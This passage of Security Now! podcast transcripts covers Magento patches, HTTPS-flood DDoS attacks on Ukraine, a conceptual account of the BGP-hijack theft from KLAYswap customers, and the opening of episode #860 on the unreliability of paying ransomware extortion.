Adobe replied:  "We have discovered" - uh-huh, yeah.  "We have discovered..."



LEO:  You know what?  I'm thinking they patched Magneto, and they forgot to patch Magento.



STEVE:  That's it.



LEO:  That's it.



STEVE:  They patched Magneto.



LEO:  It's safe now, by the way.  You can use Magneto.



STEVE:  You could crank that Magneto all you want.  That's right.  Adobe replied:  "We have discovered additional security protections necessary for CVE-2022-24086 and have released an update to address them as CVE-2022-24087.  Adobe is not aware," they wrote, "of any exploits in the wild for the issue addressed in this update."  Right.



Like the previous Sunday fix, this is also a pre-authentication remote code execution with a CVSS of 9.8.  And remember that this is PHP source being updated, so what's changed will be no mystery.  Hopefully, if you're responsible for maintaining Magento, or Magneto, well, actually Magneto you're safe from the Sunday patch, apparently.  But if you're responsible for maintaining Magento, or Adobe's commerce platform, this is already old news to you.  If not, this is one to fix immediately because, I mean, we know that the previous one was already being used in attacks.  So, yeah.



Last Tuesday, in what had to be I guess a plain and stark run-up to Russia's designs on Ukraine, which of course there was some news about last night, multiple institutions which are critical to Ukraine's military and economy were hit with denial-of-service attacks.  The attacks triggered, just because everyone's watching, I suppose, a great deal of global news and speculation despite the fact that the impact of the attacks themselves was somewhat limited.  The trouble is, the ramifications of such attacks are not.



The targets of the attacks were the Internet presence of the Armed Forces of Ukraine, the Ministry of Defense, and the country's largest two commercial banks, which was considered to be systemically important to Ukraine's financial functioning.  And these could very well have been just some target scaling.  We know that that's the nature of denial-of-service attacks.



Like most of the world, I'm quite worried about what's going on over there.  But as always, what interests us here is technology.  Adam Meyers, the Senior VP of Intelligence at CrowdStrike, said in an email to reporters at Threatpost that the attacks consisted of "a large volume of traffic, three orders of magnitude more than regularly observed traffic, with 99% of this traffic consisting of HTTPS requests."  That caught my attention because there are many implications there.



First of all, HTTPS rides on top of TCP.  TCP connections are established with a three-way handshake whose purpose is to verify and establish a functioning two-way connection between the endpoints.  As we know, both sides exchange randomly chosen 32-bit synchronization packets which will be used to number the data, the number of the data bytes that they subsequently exchange.  And it's this three-way handshake that prevents IP address spoofing of TCP connections.  Unlike with a UDP query, which is just a single packet, it's not possible to spoof the IP of an HTTPS web query which runs over TCP.



And the second part of this is the HTTPS web query itself.  Attacks are typically far more effective if they're able to exploit large asymmetries between the attacker and their target. In the case of UDP traffic, we've talked about the bandwidth amplification that can be created by many Internet services.  The simplest example is probably querying a DNS server where the query is small but the reply is large.  Size asymmetries like this are quite common on the Internet.  If attackers can ask a short question of a publicly available Internet service using the UDP protocol, which only requires a single packet, they can spoof the source IP carried by that query packet to cause the reply to be sent to their targeted victim.  In this way a little bit of traffic generates a much larger attack.



Of course, this form of asymmetry doesn't work for HTTPS, since the IP address of the endpoint generating the HTTPS query cannot be spoofed.  But a far more damaging asymmetry does exist.  A constant topic of this podcast is the fact that today's fancy websites are not built from simple static HTML pages previously written and stored on a mass storage device and then probably cached in RAM.  Today's sites are not archives, they're applications.  As such, incoming queries are examined and handled by software, typically Java, C#, PHP, Python, Node.js, or perhaps Ruby on Rails.  Several of those languages are neither multithreaded nor particularly high performance.  Many of them are interpretive.



As a result, they don't scale well.  To make matters worse, they typically read from and need to interpret page templates which direct them in the formation of the page to assemble and return, which almost always necessitates multiple if not many queries to a back-end database.



As an industry, we've built extremely complex and capable data-driven web applications.  We've kept them understandable and maintainable by using templates and databases.  But all of this elegant design has come at the high price of efficiency.  As a result of many levels of interpretation and lookup, today's websites have extremely high computational and mass storage lookup costs per page.  And this is the asymmetry that modern HTTPS query flooding attacks are leveraging.



A botnet is needed to generate such attacks, since the attacker's IP addresses cannot be hidden.  And there must be many tens of thousands of attacking IPs, otherwise the unspoofable IPs of a few attackers can be trivially blocked by a firewall filter.  But as we know, botnets consisting of many tens of thousands of previously compromised devices do exist.  Many, in fact.  And all of the flawed design IoT devices, which we also often talk about here, which continue to be casually connected to the Internet every day, just adds to that potential inventory.  As we've noted before, the only real way to know how strong a botnet is, is to fire a test shot.  What the world saw a week ago in Ukraine was an HTTPS-query-capable botnet flexing its muscles.  We may be seeing more of that in the future.  And nothing prohibits it from being aimed at any website where there is a high cost per page.



I know that - I'm blanking on the name - Cloudflare has built some specialty around protecting that kind of site.  Sometimes when I'm checking onto security sites, since security sites seem to often be a DDoS attack target, I'll get kind of this weird intercept page from Cloudflare saying that they're verifying my browser or something, which is clearly like a first-stage intercept to say, okay, we're going to let this guy through, or not.  So anyway, I have every expectation that, I mean, everyone keeps saying that cyberwarfare is the next big thing.  And if so, it's going to be botnets of this sort not doing the old-style SYN flooding, but probably bringing our websites down because it is so expensive now to produce a single page to a visitor.  If you're able to produce three orders of magnitude greater traffic than a given site has already been scaled to handle, it's gone.  It's off the Internet.



Yesterday I pushed to finish the third of the so-called "Bobiverse trilogy" so that I could report today.  And I can now recommend it without hesitation.



LEO:  Oh, good.  I just downloaded the first one.  "We Are Legion (We Are Bob)."



STEVE:  Yes.  All of our listeners who were telling me that I would love it were right.



LEO:  Nice.



STEVE:  As I had mentioned before, I was initially somewhat cooler and tentative about it.  The author's writing style is more, I guess, expositive or casual than either Ryk Brown's or Peter Hamilton's.  Both Ryk and Peter spend an inordinate amount of time on character development.  That's a big part of what makes their universes so rich and believable, but at the cost of their novels being nearly interminable.  Boy.  By comparison, Dennis Taylor just jumps right in and starts telling his story.  So while his style was initially a bit jarring to me because it's so much different from what I had been reading, I wound up truly loving his story.



It's also a lot of fun that Bob, the primary characters in the books, was himself an avid sci-fi fan, having read all the same books and watched all the same TV and movies that we have, as the readers of the story.  So the continual references, scattered throughout the trilogy, to things that only a true fan of science fiction would pick up on, like naming a vessel the Bellerophon, made the journey through the trilogy extra fun.



So there is a fourth novel that's about twice the length of the largest of the previous three.  I think the larger of the previous three was 300 and some pages.  This fourth one, "Heaven's River," is 600 and some pages.  So it's also available through Kindle Unlimited and Audible, as are all of them.  So that's what's next up for me while I await more from Ryk and Peter.



And Leo, I do think you're going to have fun.  Apparently the reader is also a well-known and expert Audible reader.



LEO:  Ray Porter, yeah.  He's good.  I've heard him before, yeah.  I'm excited.  Can't wait.



STEVE:  Yeah.  Okay.  InControl, which I announced last week, settled down quickly following its announcement last week.  I finished the technical documentation of the Registry keys it manages, added version tracking and an FAQ, then got back to work on SpinRite.  I've accomplished so much since SpinRite's last major development release that it's time for another.  I was actually hoping to get that done on Sunday, but I ran out of time.  But it'll be happening within a couple days.



I mentioned previously that I had discovered that in some cases the private information that a third-party adapter has about its own hardware, and actually in some cases even the motherboard, gives it a special advantage and keeps SpinRite from outperforming that adapter's own firmware.  Since SpinRite's total scanning time is crucial to the feasibility of its use, and since performing an occasional media scan is really the only way to spot, catch, and repair trouble before it becomes irreparable  thus SpinRite's long-term maintenance aspect  nothing is more important than minimizing that scan time.



Therefore, I realized that I needed to have SpinRite perform mini-benchmarks on those drives where it could choose which way to access the drive during its bulk surface scanning work.  So SpinRite now incorporates an integrated mini-benchmark that takes very little time, it just flashes by, but it allows SpinRite to quickly choose the fastest bulk data access method.



And as I think I mentioned before, whatever I'm doing with the AHCI controller is blowing everybody away, like by a factor of two or more.  SpinRite just saturates the SATA bus on AHCI controllers.  But that's not so much the case on the older ATA bus mastering controllers.  Anyway, I realized after having done that, that I could utilize the results from the mini-benchmark to estimate the entire drive scan time and show that in the UI in the same way that I had been showing it only after the user and only if the user had first deliberately performed a full-scale benchmark, but without needing the full benchmark.



And I saw that, I got that done, and I saw that result on Sunday.  And it was somewhat astonishing to me to see what a huge difference just that little change makes.  You start SpinRite.  It finds all the drives attached to the machine.  And then you go to the screen where you select which drive you want to run it on.  And just as it always has, it shows you the size of the drive.  But now, listed there beside each drive is the estimated time to scan that drive.  It's just a small new little feature.  But it turns out, since nothing is more important than how long it's going to take to do this, it's a real cool little new feature.



So anyway, just for any of our listeners who are working with me, do check into the newsgroups in the next day or two.  The pre-release number nine will be there.  And I can't wait to confirm all the known issues that we fixed.  And we have 15 that have been outstanding, and more than half of them have been fixed for a long time.  But I've been working on this other stuff, wanting to get as much done as I could before the next drop.  But it's time to do that.  And that'll allow us to get resynchronized and find out what issues we still have.  So we're getting there.



LEO:  Once again for Mr. Steve Gibson and the meat of the matter, the heart of the show today, BGP.



STEVE:  So this is tricky, but I think I'm going to be able to explain it to everybody.  We'll also regress a few times to talk about some of the underlying technologies that we need to understand what happened.



Earlier this month, on February 3rd, a Thursday, customers of a South Korean cryptocurrency platform known as KLAYswap lost a total of 2.2 billion Korean won, which is equivalent to around $1.9 million U.S., so no small amount, as a result of 407 fraudulent, intercepted, and altered cryptocurrency transactions across a total of 325 KLAYswap customer wallets.  So KLAYswap is a cryptocurrency exchange.  It's got customers.  Something bad happened.  And of course, as we know, such things have happened before.  But the way this was engineered to happen was diabolical and somewhat horrifying.



Okay.  So as we know, the success of most cryptocurrency heists can be traced back to some security failure on the part of the cryptocurrency exchange itself.  Attackers might compromise the account of an employee who's using a weak password and no additional authentication factors.  Or bad guys might find a flaw in the platform's online server code, use that to steal funds from the platform's customers' accounts.  Or maybe use a flaw in the operating system software and get in and then do that.  None of that happened here.



When any of us visit any sort of modern website, whether it's  Amazon, any Google property, Facebook, PayPal, our bank or whatever, the first thing that happens is that the remote site moves a chunk of its application code into our browsers in the form of JavaScript. As we've all learned, the days when much can get done on the web without any browser-side scripting, or with browser scripting deliberately disabled, are pretty much past.  As we all know, I was using NoScript as long as I possibly could, as were many of us, until I found myself needing to disable it more than not because more and more sites were just assuming that the browser I was running knew how to do JavaScript.  So I finally gave up and switched to Gorhill's uBlock Origin.  And I do sure hope I never have to give that one up.



In any event, accepting a huge blob of code from any site we're visiting is the way the web has evolved.  And that was also true when KLAYswap's customers visited the KLAYswap site.  Their browser would grab the client-side support code, over HTTPS as everything needs to be these days, from the domain developers.kakao.com, which was part of the KakaoTalk's developer infrastructure where KLAYswap hosted its official SDK which allowed third-party apps to integrate with its services.  This was all fine.  Client browsers go to KLAYswap, obtain their own version of JavaScript, which allows them to integrate, that is, their browsers to integrate, with KLAYswap's back end services.  All good.



Now, we've talked many times in the past about how Internet routing works or, more specifically, about how routing tables function.  In the IPv4 space, which is actually where this occurred, we start off with a 32-bit address.  Part of the original genius of the designers of the Internet was to realize that, rather than just assigning addresses totally at random, they realized that if the Internet supported a 32-bit machine address space, and all of the machines associated with, for example, a single organization or a network could have their addresses grouped together, then their addresses would all have identical most significant bits.



In other words, when viewed as 32-bit binary addresses, all of the bits at the left end of the address, of all of their addresses, moving right to some degree, would be the same.  All the left side of some number of bits would be identical.  The original designers called this common set of bits the "network," or more formally, the "network prefix."  And they realized that this could be used globally to route packets whose leading, you know, the left end bits were such-and-such to that entity's router for then further distribution to the individual machines there.  So that was like the origin of the concept of having a network where the network prefix numbered that network, and then you had lots of little machines within that network.



Next they realized that multiple organizations near each other and being served by the same larger Internet service provider, might differ in only another couple of bits further to the left.  This meant that all packets having slightly fewer identical left side bits could simply be sent to the ISP's network, which included all of its customers' subnetworks.  Then the ISP's routers could further subdivide its larger all-inclusive network into its individual customers' subnetworks.  In other words, the Internet, being a network of networks, can be viewed as a hierarchy of networks.  A few big mega networks, the so-called Tier 1 providers or networks, the backbone providers, whose networks are successively subdivided and subdivided and subdivided until they get down to an individual customer.



I wanted to refresh this in everyone's mind because we need to understand something that naturally falls out of this sort of hierarchy.  The way routing tables work is that, being a table, they contain a large list of these network prefixes.  And to determine where any given Internet packet should be sent, the left-most bits of each packet's address is compared to each entry in the router's routing table.  It's looking for the longest network prefix in the table that matches the packet's destination IP.  Once the longest prefix match, as it's called, the longest prefix match is found, the packet is routed toward the network having that longest matching prefix.



And finally, with Internet routers scattered all over the Internet, the last piece of technology we need is a means for maintaining all of these separate routing tables.  That's what the Border Gateway Protocol provides.  Routers that are connected to each other continually share their routing information with their peers.  If, for example, some new and previously unused block of IPs were to be assigned to someone connected to a router, that router would need to tell its peers the equivalent of, "Hey!  I've just become responsible for this block of IP addresses.  So if you receive any packets for that new network, forward those to me."



BGP is what makes that possible.  And when you stop to think about it, the news of that new network needs to be spread.  The router that directly receives that announcement, or advertisement as it's formally called, first adjusts and updates its own routing table to incorporate the news of that new route.  Then, having adjusted its own table, it sends out the announcement of its change to each of its peers in turn.  And they do the same.  Thus within a very few minutes the news of this new network will have propagated across the globe, and every router will know where to send packets, if they receive any, for that new network.



We've also talked about Autonomous Systems, or AS numbers.  Any entity that has blocks of IP addresses assigned to it has an AS number.  And it is said that the Autonomous System "owns" those IPs.  This just means that any Internet traffic placed onto the Internet anywhere, whose network address prefix matches any of the prefixes owned by that Autonomous System, will have those packets routed to them.



Kakao.com, the Internet service provider, is Autonomous System number 38099, and that provider owns a block, actually owns many blocks.  But one of the blocks of IP addresses, a block of 512 IP addresses at 121.53.104.0/23.  The /23 indicates that the left-hand 23 bits of the IP address is the network prefix.  So since we have a total of 32 bits in the address, and 23 is the network prefix, that means that the remaining nine bits at the right end of the IP address are the machines within that network.  When routers encounter packets with the proper first 23 bits, that means that the packet is destined to AS38099.  So that's where the router forwards the packet.



Kakao.com's server at developers.kakao.com is the domain serving the JavaScript for this cryptocurrency exchange.  Developers.kakao.com lives at IP address 121.53.104.157, which is within those 512 IP addresses owned by AS38099.  So all was well.



Until someone posing as AS9457 - which actually is a major player.  Dreamline Co is a major Internet carrier in South Korea with control over, meaning owning, 1,793,723 IP addresses.  Someone posing as AS9457 managed to sneak a fraudulent BGP routing table update into the global network.  Now, additional technical details are available, but they're all written in Korean, which is not a language I'm able to read.  It may have been that it was a compromise at Dreamline Co, or just a break- in to the inter-router BGP communications.  Or maybe they actually did edit the routing table of a router belonging to Dreamline.  We don't know.  Both have occurred in the past.



But what happened in this case is someone managed to sneak a more specific route into the global routing tables.  Whereas the actual route for the real network is a /23, the bad guys or, Leo, the miscreants, as we like to call them...



LEO:  Yes.



STEVE:  ...snuck in a /24 route which specified one additional bit of the network prefix for the network which also contained the developers.kakao.com IP address and server.  Since all of the world's routers saw that as being a more specific route because it specified a longer network prefix, the traffic that should have gone to the proper AS38099 was instead routed to a machine somewhere in AS9457.  And the guys who set this all up were, of course, ready.  They had a server ready to impersonate the original, the authentic "developers.kakao.com" machine, complete with a freshly minted authentic TLS certificate which they had obtained the instant they commandeered the network.  If you own an IP address, you can quickly obtain a certificate for any machine that DNS points to there.



Once they had set up their clone of developers.kakao.com, they began serving malicious JavaScript from that host.  The actual file was https://developers.kakao.com/sdk/js/kakao.min.js.  So it was minified JavaScript.  For a period of two hours, from 11:30 to 1:30 on February 3rd, KLAYswap's customers who visited KLAYswap's site to perform secure cryptocurrency transfers unwittingly received malicious JavaScript, despite the fact that their browsers were pulling code over HTTPS from the correct URL.



The malicious JavaScript had been modified to include additional code at the end of the file which would wait for the user to initiate a transaction on the KLAYswap website, such as an asset deposit, a swap, or withdrawal.  When such an action was detected, the code would hijack the funds and send the user's assets to an attacker-controlled wallet.  From there the funds were immediately laundered through Orbit Bridge and FixedFloat, two cross-blockchain conversion services, thus laundering them.  Two hours after the attacks began, still undetected at that time, the attackers voluntarily removed the fraudulent routing table entry from BGP, and normal packet flow resumed.



When you consider all of the moving pieces that had to be in place, working and tested, this was a very impressive attack which had to have taken months of planning.  These guys had a high-end knowledge and understanding of many facets of the operation of the Internet.  And they had some access somehow because you have to have that, too.  And they may have needed to create custom tools to make this happen.



There's been a lot of talk about securing BGP.  It's a huge and glaring problem.  But still today Internet routing is largely based upon trust.  When that trust is undeserved, there's very little that can be depended upon.  It would not be difficult to make the case that the Internet is still not ready for primetime.  Mostly it works, but in specific highly targeted instances like this, it really does seem that we come back to targeting being a problem with the way some of our systems work.



Anyway, I just thought it was fascinating that what we normally see as a mistake, where a chunk of the East Coast disappears because somebody entered something wrong, or all of the Internet gets routed through Belgrave for some reason and crashes it, in this case no.  Just a selected little chunk, a little /24 got peeled away from a /23, sent somewhere else, and that's all it took because the guys were ready for what would happen when they had that access.



LEO:  Just that easy.  Wow.



STEVE:  Wow, yeah.



LEO:  Yeah.  Well, that's good to know because I always do blame the originators for BGP errors.  Sometimes it's not your fault.  Good to know.  Steve Gibson, it's never his fault.  He's always here to enlighten, and does that every Tuesday, 1:30 p.m. Pacific, 4:30 Eastern, 21:30 UTC.  If you want to watch us do it live, you can at live.twit.tv.  After the fact he's got 16Kb audio of the show, 64Kb audio, transcriptions, all at his website, GRC.com.  We also have copies of 64Kb audio and video at our website, TWiT.tv/sn.



When you head over to GRC, pick up a copy of SpinRite, the world's best mass storage, maintenance, and recovery utility.  Version 6 is out.  As you can hear, we're getting close to 6.1.  You can participate in the development, and you'll get a free copy of 6.1 if you buy now.  SpinRite is available at GRC.com, along with ShieldsUP! and all the other many, many, many wonderful freebies Steve offers us, including his forums.  You can leave a message for him there at GRC.com/feedback, or on his Twitter.  His DMs are open at @SGgrc.  @SGgrc is his Twitter handle.



I think we have done everything we need to do.  A last chance to take our survey.  It ends on the 28th, so this is the last chance you have to do it.  If you go to TWiT.tv/survey22, take a few minutes.  Helps us know you better for both purposes of ad sales, but also to decide what kind of programming you want.  And yes, I know, it doesn't ask you if you use Linux.  We're just going to take it as assumed that if you use a computer, you're using Linux.  So, you know, you don't have to even write that in.  We just know.  We just know you use Linux.  TWiT.tv/survey22.  Of course it's voluntary.  But it sure does help us an awful lot.  Steve, have a great week.  I'm off to the Bobiverse.



STEVE:  Cool.



LEO:  And I'll see you next time on Security Now!.



STEVE:  You're going to have fun.  See you then.  Bye.



Copyright (c) 2022 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.






GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#860

DATE:		March 1, 2022

TITLE:		Trust Dies in Darkness

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-860.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we examine the consequences of paying ransomware extortion demands.  How did that work out for you?  We take a deep look into "Daxin," a somewhat terrifying malware from attackers linked to China.  We take something of a retrospective look at Log4j and draw some lessons from its trajectory.  We touch on some technical consequences of Russia's invasion of Ukraine, including which kitchen appliances Russia's servers are claiming to be, and the question of the possible consequences of the U.S. becoming involved in launching some cyberattacks at Russia.  We have a piece of interesting listener feedback and the results of last week's next SpinRite development pre-release.  Then we're going to take a look at the significant mistake Samsung made which crippled and compromised the security of all 100 million of their most recently made Smartphones.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.	 News flash.  Ransomware authors are not reliable.  Shocking; isn't it?  A new nation-state attack, we think from China.  Why some Russian websites are saying, "Hey, I'm a teapot."  And then the hundred million Samsung phones that have a fatal flaw, and what you can do about it.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 860, recorded Tuesday, March 1st, 2022:  Trust Dies in Darkness.



It's time for Security Now!.  And you couldn't have a better time for this guy to show up, Steve Gibson of GRC.com, our security guru, our privacy mentor, our sensei of...



STEVE GIBSON:  Security.



LEO:  Security.  Yeah, I said - I was trying to find a new word for security.



STEVE:  Yeah, it's a little alliterative.



LEO:  Alliterative word for security.  Safety.  Our sensei of safety.  He's here...



STEVE:  Oh, I like that. 



LEO:  Yes, to lead us down the path to righteousness. 



STEVE:  Lead us from darkness.



LEO:  Yes.



STEVE:  Today's podcast is from the first portion of a recently released and to be shown later this year paper from three security researchers at the University of Tel Aviv.  Podcast title is "Trust Dies in Darkness."



LEO:  Oh, boy.



STEVE:  It's a little gloomy.  So we've got Security Now! #860 for this first day of March.  So that means we're going to have one of those weeks, or a month where we get the earliest Patch Tuesday possible, which will be next Tuesday, March 8th.  And we'll get there in due time.  We're going to examine first the consequences of paying ransomware extortion demands.  How did that work out?  We're going to take a deep look into Daxin, frankly a somewhat terrifying malware from attackers linked to China.  We take something of a retrospective look at Log4j and draw some lessons from its trajectory.  We're going to touch on some technical consequences of Russia's invasion of Ukraine, including which kitchen appliances Russia's servers are claiming to be.



LEO:  What?  Okay.  Okay.



STEVE:  I know.  And the question of the possible consequences of the U.S. becoming involved in launching some cyberattacks at Russia.



LEO:  Yes.  I want to talk about that.  I think that's a little interesting, the saber-rattling, yeah.



STEVE:  A real mixed blessing.



LEO:  Yeah.



STEVE:  We also have an interesting piece of listener feedback that comes from last week, and the results of last week's next SpinRite development pre-release, which I mentioned was coming.  It did.  Then we're going to take a look at the significant mistake Samsung made which crippled and compromised the security of all 100 million of their most recently made smartphones. 



LEO:  Yeah.



STEVE:  Because they did it in darkness.



LEO:  Yeah, yeah, yeah.



STEVE:  And that's where trust goes to die.



LEO:  Yes.  They thought they were doing everything right.



STEVE:  They did, but they didn't let anybody see.  And so there are a number of things that we're going to talk about this week which are basically putting meat on some of the fundamental principles that I've been talking about on the podcast for years.



LEO:  It's the old pseudorandom number generator problem once again.



STEVE:  And we do have a fun Picture of the Week.  



LEO:  We do.



STEVE:  Which we'll be coming back to shortly.



LEO:  Yes, any moment now.  I'm going to call you the Sensei of Assembly Language, that's what I'm going to call you.  And now the Picture of the Week.



STEVE:  So, okay.  So we have, I suppose, a programmer who has recently met his demise, presenting himself to the Pearly Gates.  And, now, traditionally St. Peter has had a long scroll, which he's scrolled through to find out the disposition of this recently passed person.  But this is 2022, so he has a laptop.  Anyway, St. Peter is telling the programmer:  "Says here you should be in hell; but since you coded in Assembly, we'll count it as time served."



LEO:  Oh, now, you love your assembly language.



STEVE:  You just can't take that assembly away, period, nope.  That's my language.



LEO:  For you, hell is a high-level language.



STEVE:  And I visit there from time to time.  I prefer assembly language.



LEO:  What high-level languages do you write in?



STEVE:  Perl is one.



LEO:  Oh, nice.



STEVE:  Yeah, Perl.  I never got into PHP, but of course C.  In fact, I'll be mentioning a little bit later that I implemented a cryptographic algorithm which I needed for SQRL in C, and open-sourced it because - and I wrote it in C...



LEO:  Oh, nice.



STEVE:  ...so that everybody else would have access to it.  So, you know, sort of whatever the need is.  Gravity was written in C, and I've been maintaining it now for a few years when it famously, at the beginning of 2020, it stopped working because the programmers put in, if an article's date is 2020 or later, it must be bogus.  Well, that was true in 1980...



LEO:  Yeah, not so much now.



STEVE:  ...when, you know, Gravity was in use.  But not so much now.  So it needed a little...



LEO:  I love C.  Kernighan and Ritchie, that little slim C programming language book, one of my favorites of all time.  It just...



STEVE:  Yes, yes.



LEO:  It was so elegant and simple and beautiful.  And I had come from, as most of us had, BASIC, you know, a little bit of BASIC.  And when I found C, I was, you know, this is probably '83 or '84, very early on.  I just fell in love.



STEVE:  Well, and the idea, too, that the language would just provide a minimum structuring environment for the library.  That is, you know, most of C is in the functions which you call.  And then there's just a little bit of glue, you know, some curly braces and some loops, looping structures and variable naming.  But, you know, it just, they just...



LEO:  I like that in a language.  I think a language should be easy to grasp.  That's one of the reasons I like Lisp and Scheme and those languages.  The idea is you could teach it in a day.  You can learn it in a day.  Then there's a lot more.  But languages like Perl, you know, where their philosophy is there's more than one way to do it, there are so many extra little - so much - who was it, it was Perlis who said:  "Syntactic sugar will give you cancer of the semicolon."  There's so much syntactic sugar.  There's so much extra stuff.



STEVE:  I have the perfect example.  For anybody who wonders what we're talking about in Perl, everyone's heard about like the "if" statement, you know, if this, then that.  Do you really need "unless"?



LEO:  No.  No.



STEVE:  I'm not kidding.  There's an unless.



LEO:  Makes no sense.  Oh, I know.  Lisp doesn't even have do loops.  They don't even have, I mean, there's no iteration.  You don't need it because it's all there.  And so the less you have to bend your mind to understand this, I think the sooner you get down to getting stuff done.



STEVE:  Yeah.  Just, come on.



LEO:  Unless.  Maybe.  Well, there's a maybe, too, by the way.  You know there's a maybe clause.  Let's not get into it.



STEVE:  No, no.  If you really want to, and we have mentioned this once before on the podcast, but there was once an exercise some friends and I did of designing a language kind of backwards.  So rather than having the go-to statement, you would have the come-from.  And you can actually do that.



LEO:  Come-from.  Okay.  Okay.  The beauty of...



STEVE:  Yeah.  That one will hurt you.



LEO:  ...C, and your assembly, and Lisp, too, is you can do macros.  So if you want to have a come-from, you can write it.



STEVE:  Oh, in fact, for example, I believe that language is for communication, not only with the computer, but for the programmer.  So I have a macro, which the macro is zero, Z-E-R-O.  And what it expands to is XORing P1 with P1.  So anyway, so for example, in my code I say zero EAX, which zeroes the EAX register.



LEO:  And it's clearer to have that than the XOR.



STEVE:  Yes.



LEO:  You know and I know the XOR is zeroing it.



STEVE:  Yes.



LEO:  But by writing zero it's very clear when you're reading the code.  The machine doesn't care.



STEVE:  Nope, same thing for the machine.



LEO:  The machine sees the XOR, yeah.



STEVE:  Exactly.



LEO:  Yeah, no, I love that.  That's exactly right.  You're writing for yourself 10 years from now, or even six months from now.



STEVE:  Yeah.  The older we get, the shorter the duration.



LEO:  Why did I do that?  What am I doing here?



STEVE:  Okay.  So one of the things any victim of a ransomware extortion wonders is whether the bad guys, who at that moment hold all the cards, will honor their promises to never come back for a double dip at the ransom trough.  Last week, Help Net Security reported on the result of a global survey that was conducted by the cybersecurity firm Venafi (V-E-N-A-F-I), which highlighted the unsurprising lack of trustworthiness - yeah, who would have thunk - of ransomware bad guys.  The report found that in most cases, once the initial ransom is paid, the extortion shock does not end.  And the report puts some numbers to this unsurprising conclusion.



Venafi calls themselves "The world's most trusted machine identity management platform."  And while I don't know about that, I saw that they specialize in, among other things, keeping an organization from being surprised by the expiration of their machine identifying certificates.  I know that my favorite company, DigiCert, does the same thing.  So I guess Venafi does something similar, although I don't think they make certs.  Anyway, they are certainly aware of and in the enterprise space. 



Their survey revealed that 18%, so about one in five, of victims who paid the ransom still had their data exposed on the dark web.  8% refused to pay ransom, and the attackers used every available extortion opportunity, like pushing them every way they could.  35% of victims paid the ransom, but nonetheless were still unable to retrieve their data.  One in three paid the ransom, oops, sorry, decryption didn't work.



As for the ransomware actor extortion tactics, they summarized those, too.  83% of all successful ransomware attacks featured double and even triple extortion, the first extortion being over the data encryption, the second extortion over the public release of confidential or trade secret data, and the third extortion is a DDoS.  We're going to attack you if you don't follow one of our previous extortions.  So, I mean, it's a mess.  38% of ransomware attacks threatened to use stolen data to extort the victim's customers.  35% of ransomware attacks threatened to expose stolen data on the dark web.  And 32% of attacks threatened to directly inform the victim's customers of the data breach incident, you know, and we've talked about this before, by way of embarrassing them.



So Venafi explained that the lack of credibility of ransomware actors' promises to their victims stems from several factors.  First, most ransomware-as-a-service operations are short-lived, so they simply look to maximize their profits in the shortest possible period of time.  As such, they don't care about long-term reputation.  We've witnessed on this podcast a continual churn of ransomware-as-a-service names with a suspicion that new actors coming on the scene are relabeled old actors.



Of course, secondly in ransomware-as-a-service, the operators and their affiliates are separate entities, and many renegade affiliates don't follow the rules set by the core ransomware operators.  Enforcing these rules is rarely considered a priority for the groups.  Third, even if the data isn't leaked right away, the remnants of data breaches may be maintained for a long time in multiple threat actor systems and almost always find their way to the broader cybercrime community sooner or later.  You know, you can imagine, if you're a bad guy, and you've got the goods on some company, and you've promised to delete it, well, why would you?



You could for a while, you know, maybe abide by your agreement.  But again, really, we're talking criminals.  So why expect noncriminal activity from bad guys?  As Venafi's report underlines, paying the ransom is only motivating the crooks to return for more, as it sends the signal that the victim sees this as the easiest way out of trouble, which is just an illusion.



Venafi's vice president said:  "Organizations are unprepared to defend against ransomware that exfiltrates data, so they pay the ransom.  But this only motivates attackers to seek more.  The bad news is that attackers are following through on extortion threats, even after the ransom has been paid.  This means CISOs are under much more pressure because a successful attack is much more likely to create a full-scale service disruption that affects their customers."



And in a different but related report published by Proofpoint just yesterday, Monday, which presents the results from a survey of thousands of employees and hundreds of IT professionals across seven countries, they found that 70% of the surveyed participants reported having experienced at least one ransomware attack last year, in 2021, 70% of respondents.  60% of them opted to negotiate with the attackers, so 60% of the 70%, and many of them ended up paying ransom more than once.



Now, the only way that would work would be that the initial ransom is for both data encryption and a promise to destroy exfiltrated data.  Then once that money is in hand, and the decryption keys have been provided, that second demand is made for the second half, even though the promise was nothing, you know, there would no exfiltration if you pay up.  Well, so the money is received.  Decryption keys happen.  Then a demand is made, a second demand, for additional money.  And the logic must be that getting an additional payment from a victim who has already paid once is easier.  They've got a proven payment channel.  They've figured out how to convert dollars into bitcoin or whatever.  They've already invested something in ransom.  So what's just a bit more to keep, they believe, to keep their data out of the hands of either the dark web or the public.



And really, why should such people as the bad guys not turn right around either way, if the victim pays up or not, and resell the data again on the dark web?  Again, as I said, why delete an asset?  It seems clear that that's what would be done.  For a while there was, and we talked about it here, a working theory that the ransomware gangs were, to some degree, they had a motivation to be concerned about their reputation since it would tend to increase the likelihood of the ransom being paid if it was generally understood that, when ransom is paid, decryption keys are provided.  But that was before that secondary incentive was added, because it was added later on, of data exfiltration and its extortion to prevent its subsequent release and/or sale.



And it was also before the ransomware-as-a-service model tended to blur the lines of who was doing the attacking and who was responsible for keeping their word.  While the ransomware-as-a-service operators tightly control the unlocking of the encrypted data, we know that, it's the separate individual affiliates who obtain control of and get the pre-encrypted exfiltrated data.  They hold that separately.  Therefore, the RaaS operators have no say or control over the possibility of secondary extortion being perpetrated by the independent affiliates.  So there's just been a lot of change in this side of the world.  



And finally, whereas ransomware was a little-known novelty once upon a time, with only a few perpetrators, it's grown into a well-known and recognized form of cybercrime with too many villains now to count.  So it's dramatically changed the calculus about any one gang's reputation.  It just no longer matters.  As a consequence of all this, all the data points to the only sane approach being to never capitulate to ransomware demands.  I mean, unless you absolutely have no backups of your systems, and the data which has been encrypted absolutely has to be restored.



